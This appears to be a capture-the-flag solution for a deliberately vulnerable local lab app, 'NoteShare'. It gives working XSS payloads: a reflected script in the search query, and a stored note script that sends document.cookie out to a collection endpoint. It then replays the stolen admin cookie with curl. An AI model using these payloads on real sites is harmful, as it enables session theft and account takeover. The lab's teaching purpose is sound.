# Solution — NoteShare

---

## Objective 1 — Reflected XSS via search

Log in as `mallory` / `mallory123`, go to **Search**. The query gets
reflected into the results heading with no encoding:

```
GET /search?q=hello
```

renders `<h2>Results for: hello</h2>` — try breaking out of that context:

```
GET /search?q=<script>fetch('/api/solve/reflected-xss',{method:'POST'}).then(r=>r.json()).then(d=>alert(d.flag))</script>
```

The script runs in your own browser as soon as the page loads and pops the
flag via `alert()`. It also POSTs to an endpoint that only makes sense to
call from a real execution context — `curl`ing that same URL wouldn't
reflect a `<script>` tag that actually *runs*, only one that sits inert in
the response body. Go to `/notes` afterward and you'll see the objective
marked solved.

**Root cause:** `views/search.ejs` renders the query with EJS's `<%- %>`
(unescaped) instead of `<%= %>` (escaped). One tag, one character
difference, full reflected XSS.

---

## Objective 2 — Steal the admin's session

Nothing links to an admin panel from your account, and you don't have
admin credentials. But there's a **Report a link** feature, and its own
copy tells you a real person reviews it: *"our support team will take a
look."* That's your signal — whoever reviews it is authenticated as
someone, in a real browser.

**Step 1 — find the stored XSS.** Notes render their body unescaped too
(`views/note.ejs` uses `<%- note.body %>`, same bug as objective 1, different
field). Create a note with a payload that steals whatever cookie is
present when it loads:

```
Title: Please review
Body:  <script>fetch('/api/collect?c=' + encodeURIComponent(document.cookie))</script>
```

Note the note's ID from the URL after saving — e.g. `/notes/2`.

**Step 2 — report it.** Go to **Report a link**, submit:

```
http://localhost:8081/notes/2
```

This triggers the support bot: it logs into a real admin account in a
headless browser, navigates to your note, and your script runs *in the
admin's session* — because by the time your script executes,
`document.cookie` belongs to whoever is currently logged in on that page,
and that's the bot now, not you.

**Step 3 — check what you caught.** Go to **My reports**. You should see a
captured cookie value logged a few seconds after the bot finished — that's
the admin's session cookie, exfiltrated to `/api/collect` by your payload
running inside their session.

**Step 4 — use it.** Copy the captured cookie value and set it as your own
session cookie (browser DevTools → Application/Storage → Cookies → edit
the value, or replay the request with it directly):

```bash
curl -s --cookie "connect.sid=<captured value>" http://localhost:8081/admin/dashboard
```

The flag is on that page.

**Root cause, two layered bugs:**
1. The session cookie is issued with `httpOnly: false` — readable from
   JavaScript at all, which a correctly-configured session cookie
   shouldn't be.
2. The stored XSS in note bodies means *anyone whose browser renders that
   note* — including an admin reviewing a report — executes your script in
   their own authenticated context.

Reflected XSS proves you can run code. Stored XSS against a privileged
viewer is where XSS turns into account takeover — the gap between "cute
bug" and "critical finding" in almost every real XSS report that gets paid
well.
